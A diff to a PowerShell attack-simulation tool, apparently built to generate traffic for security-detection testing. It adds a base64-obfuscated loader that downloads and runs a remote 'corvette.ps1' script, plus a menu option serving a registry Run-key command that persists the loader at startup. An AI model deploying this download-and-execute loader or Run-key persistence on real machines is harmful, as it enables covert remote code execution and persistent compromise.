@@ -1,5 +1,6 @@
 
 Set-Variable -Scope script -Name PATTERN_IPV4_ADDR -Option Constant -Value "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+Set-Variable -Scope script -Name CORVETTE_DYNAMIC_LOADER -Option Constant -Value "JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
 
 function IsFile (
     [string]$path
@@ -2292,6 +2293,33 @@ class IptgenHttpFileDownload : IptgenBase {
         }
     }
 
+    [void]DownloadCorvettePersistenceScript(
+        [Microsoft.Management.Infrastructure.CimInstance]$interface,
+        [string]$client_ip,
+        [string]$server_ip
+    ) {
+        $body_data = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
+        $body_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($body_data))
+        $iptgen_json_data = [IO.File]::ReadAllText($this.iptgen_json)
+        $iptgen_json_data = $iptgen_json_data.Replace('${response_body_b64}', $body_b64)
+        $iptgen_json_path = $this.iptgen_json + ".tmp"
+
+        $Env:client_ip = $client_ip
+        $Env:server_ip = $server_ip
+        $Env:request_path = "/corvette-ps.ps1"
+        $Env:response_content_type = "text/plain; charset=utf-8"
+
+        if (AskYesNo "Are you sure you want to run?") {
+            [IO.File]::WriteAllText($iptgen_json_path, $iptgen_json_data)
+
+            $response_interval = 10
+            if ($this.https) {
+                $response_interval = 0
+            }
+            $this.Run($interface.InterfaceAlias, $iptgen_json_path, $response_interval)
+        }
+    }
+
     [void]Run() {
         $interface = $this.SelectInterface()
         if ([string]::IsNullOrEmpty($interface)) {
@@ -2311,6 +2339,7 @@ class IptgenHttpFileDownload : IptgenBase {
         while ($true) {
             Write-Host "Download File:"
             Write-Host " 1) corvette.ps1"
+            Write-Host " 2) corvette persistence-enabling script"
             Write-Host " q) Exit"
             try {
                 :retry do {
@@ -2318,6 +2347,10 @@ class IptgenHttpFileDownload : IptgenBase {
                     switch($cmd) {
                         "1" {
                             $this.DownloadCorvette($interface, $client_ip, $server_ip)
+                            return
+                        }
+                        "2" {
+                            $this.DownloadCorvettePersistenceScript($interface, $client_ip, $server_ip)
                             return
                         }
                         "q" {
@@ -2906,6 +2939,22 @@ class RsgcliHttpFileDownload : RsgcliBase {
         }
     }
 
+    [void]DownloadCorvettePersistenceScript([PropsRsgSvr]$rsgsvr) {
+        $body_data = 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "corvette" /t REG_SZ /f /d "powershell -e ' + $script:CORVETTE_DYNAMIC_LOADER
+        $body_b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($body_data))
+        $rsgcli_json_data = [IO.File]::ReadAllText($this.rsgcli_json)
+        $rsgcli_json_data = $rsgcli_json_data.Replace('${response_body_b64}', $body_b64)
+        $rsgcli_json_path = $this.rsgcli_json + ".tmp"
+        
+        $Env:request_path = "/corvette-ps.ps1"
+        $Env:response_content_type = "text/plain; charset=utf-8"
+
+        if (AskYesNo "Are you sure you want to run?") {
+            [IO.File]::WriteAllText($rsgcli_json_path, $rsgcli_json_data)
+            $this.Run($rsgsvr.host, $rsgsvr.port, $rsgcli_json_path)
+        }
+    }
+
     [void]Run() {
         Write-Host ""
         Write-Host "### Enter the RSG Server and HTTP file download configuration"
@@ -2923,6 +2972,7 @@ class RsgcliHttpFileDownload : RsgcliBase {
         while ($true) {
             Write-Host "Download File:"
             Write-Host " 1) corvette.ps1"
+            Write-Host " 2) corvette persistence-enabling script"
             Write-Host " q) Exit"
             try {
                 :retry do {
@@ -2930,6 +2980,10 @@ class RsgcliHttpFileDownload : RsgcliBase {
                     switch($cmd) {
                         "1" {
                             $this.DownloadCorvette($rsgsvr)
+                            return
+                        }
+                        "2" {
+                            $this.DownloadCorvettePersistenceScript($rsgsvr)
                             return
                         }
                         "q" {
@@ -4608,7 +4662,7 @@ class HighRiskToolsAndCommands : CommandBase {
             }
         } else {
             $reg = New-ItemProperty -Force -Path $path -Name $name `
-                -Value "powershell -e JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
+                -Value "powershell -e $script:CORVETTE_DYNAMIC_LOADER"
             Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at $path"
         }
     }
